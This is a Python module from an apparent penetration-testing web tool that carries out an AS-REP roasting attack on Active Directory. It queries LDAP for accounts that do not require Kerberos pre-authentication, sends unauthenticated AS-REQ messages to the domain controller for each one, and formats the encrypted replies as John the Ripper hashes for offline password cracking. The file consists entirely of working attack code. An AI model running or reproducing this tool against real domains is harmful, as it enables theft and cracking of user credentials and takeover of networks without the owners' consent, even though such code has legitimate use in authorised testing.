from __future__ import division
from __future__ import print_function
import datetime
import logging
import random
import sys
from binascii import hexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from pentestui.pentest_api.attacks.kerberos.modules import version
from pentestui.pentest_api.attacks.kerberos.modules.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH
from pentestui.pentest_api.attacks.kerberos.modules.krb5 import constants
from pentestui.pentest_api.attacks.kerberos.modules.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from pentestui.pentest_api.attacks.kerberos.modules.krb5.kerberosv5 import sendReceive, KerberosError
from pentestui.pentest_api.attacks.kerberos.modules.krb5.types import KerberosTime, Principal
from pentestui.pentest_api.attacks.kerberos.modules.smbconnection import SMBConnection
from pentestui.pentest_api.attacks.kerberos.modules.krb5.v5Error import ASrepRoast
from ldap3 import Server, Connection, ALL, Tls, EXTERNAL, SASL, DIGEST_MD5
from pentestui.pentest_api.attacks.dns.resolution import DNSResolution
from pentestui.pentest_api.models import ProcessUI

class DomainPars:
    """Detection To Domain Name"""
    def DetectDomainLen2(self, DomainName):
        """Parent Domain Detection"""
        self.dc1 = DomainName.split('.')[0]
        self.dc2 = DomainName.split('.')[1]

    def DetectDomainLen3(self, DomainName):
        """Child Domain Detection"""
        self.dc1 = DomainName.split('.')[0]
        self.dc2 = DomainName.split('.')[1]
        self.dc3 = DomainName.split('.')[2]


class GetasreProcessENUM(DomainPars, DNSResolution, ASrepRoast):
    """ASREP ROAST ATTACK CLASS"""
    def ReceivedArguments(self, ldapusername, ldapassword, serverIP, domainName, user):
        """Connection to Server"""
        # IP Check
        self.ResolArguments(serverIP)
        if self.socketstatuts == 'Open':
            oName = 'As-rep Roast Attack'
            simpleServer = Server(serverIP, get_info='ALL')
            simpleConn = Connection(simpleServer, user=ldapusername, password=ldapassword)

            if not simpleConn.bind():
                self.ldapconnection = 'No Connection'

            self.preauthusers = []
            # Enumeration TO Pre_Auth Users On Target
            if len(domainName.split('.')) == 2:
                self.DetectDomainLen2(domainName)
                # Ldap Pre Auth Users
                simpleConn.search('dc=%s,dc=%s'%(self.dc1,self.dc2), "(userAccountControl:1.2.840.113556.1.4.803:=4194304)",  attributes=['sAMAccountName'])
                total = simpleConn.entries
                if len(total) == 0:
                    self.resultAsrep = []
                    self.resultAsrep.append('Pre-Auth Users Not Found')
                    RegisterToDb = ProcessUI(operationName=oName, result=self.resultAsrep, serverIP=serverIP, userinf=user)
                    RegisterToDb.save()
                else:
                    for entry in total:
                        self.preauthusers.append(str(entry['sAMAccountName']))
                    self.AsrepArguments(ldapusername, ldapassword, domainName, serverIP, self.preauthusers, user)
            elif len(domainName.split('.')) ==3:
                self.DetectDomainLen3(domainName)
                # Ldap Pre Auth Users
                simpleConn.search('dc=%s,dc=%s,dc=%s'%(self.dc1,self.dc2,self.dc3), "(userAccountControl:1.2.840.113556.1.4.803:=4194304)",  attributes=['sAMAccountName'])
                total = simpleConn.entries
                if len(total) == 0:
                    # Status Check
                    self.resultAsrep = []
                    self.resultAsrep.append('Pre-Auth Users Not Found')
                    RegisterToDb = ProcessUI(operationName=oName, result=self.resultAsrep, serverIP=serverIP, userinf=user)
                    RegisterToDb.save()
                else:
                    for entry in total:
                        self.preauthusers.append(str(entry['sAMAccountName']))
                    self.AsrepArguments(ldapusername, ldapassword, domainName, serverIP, self.preauthusers, user)

        elif self.socketstatuts == 'Close':
            self.resultAsrep = []
            self.resultAsrep.append('LDAP Connection Could Not Performed')

    def AsrepArguments(self, ldapusername, ldapassword, domainName, serverIP, preauthusers, user):
        """ As-rep Roast Attack Arguments """
        self.__username = ldapusername
        self.__password = ldapassword
        self.__domain = domainName
        self.__kdcHost = serverIP
        self.preauthusers = preauthusers
        self.__outputFormat = 'john'
        self.resultAsrep = []
        oName = 'As-rep Roast Attack'
        for username in self.preauthusers:
            entry = self.getTGT(username)
            self.resultAsrep.append(entry)

        RegisterToDb = ProcessUI(operationName=oName, result=self.resultAsrep, serverIP=serverIP, userinf=user)
        RegisterToDb.save()

    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getMachineName(self):
        # CHECK TO KDC
        if self.__kdcHost is not None:
            s = SMBConnection(self.__kdcHost, self.__kdcHost)
        else:
            s = SMBConnection(self.__domain, self.__domain)
        try:
            s.login('', '')
        except:
            self.resultAsrep.append(self.SMBErrorConnection())

        else:
            s.logoff()
        return s.getServerName()

    def getTGT(self, userName , requestPAC=True):
        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        asReq = AS_REQ()

        domain = self.__domain.upper()
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)


        reqBody['realm'] = domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
        seq_set_iter(reqBody, 'etype', supportedCiphers)
        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, self.__kdcHost)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.__kdcHost)
            else:
                self.resultAsrep.append(e)

        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            entry = self.KerberosPreAuthError(userName)
            self.resultAsrep.append(entry)


        if self.__outputFormat == 'john':
            # Trying make krb hash with john format
            try:
                return '$krb5asrep$%s@%s:%s$%s' % (clientName, domain,
                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
            #
            except:
                pass
        else:
            # Trying make krb hash with other format
            try:
                return '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
                                                       hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                       hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
            #
            except:
                pass
